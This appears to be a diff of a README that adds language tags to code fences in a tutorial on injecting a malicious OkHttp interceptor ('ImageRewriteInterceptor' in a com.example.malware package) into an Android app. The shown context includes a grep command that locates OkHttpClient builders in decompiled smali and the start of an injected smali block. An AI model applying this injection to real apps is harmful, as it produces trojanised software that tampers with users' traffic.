@@ -276,7 +276,7 @@ But then Perplexity gave me the okhttp3 function of intercept
 ![[image23.png]](readme-resources/image23.png)
 So with the help of Perplexity I came up with this code
 
-```
+```kotlin
 package com.example.malware  
   
 import okhttp3.Interceptor  
@@ -370,7 +370,7 @@ For us there is also another folder there but that doesn't matter
 I did this using perplexity they made this search command for me
 
 
-```
+```bash
 rg "new-instance v[0-9], Lokhttp3/OkHttpClient\$Builder" -n smali* || \
 grep -R "Lokhttp3/OkHttpClient\$Builder;-><init>" smali*
 ```
@@ -389,7 +389,7 @@ But you don't know the number so here it was 0
 
 ![[image33.png]](readme-resources/image33.png)
 
-```
+```smali
     # --- your injected code start ---
     new-instance v1, Lcom/example/malware/ImageRewriteInterceptor;
     invoke-direct {v1}, Lcom/example/malware/ImageRewriteInterceptor;-><init>()V
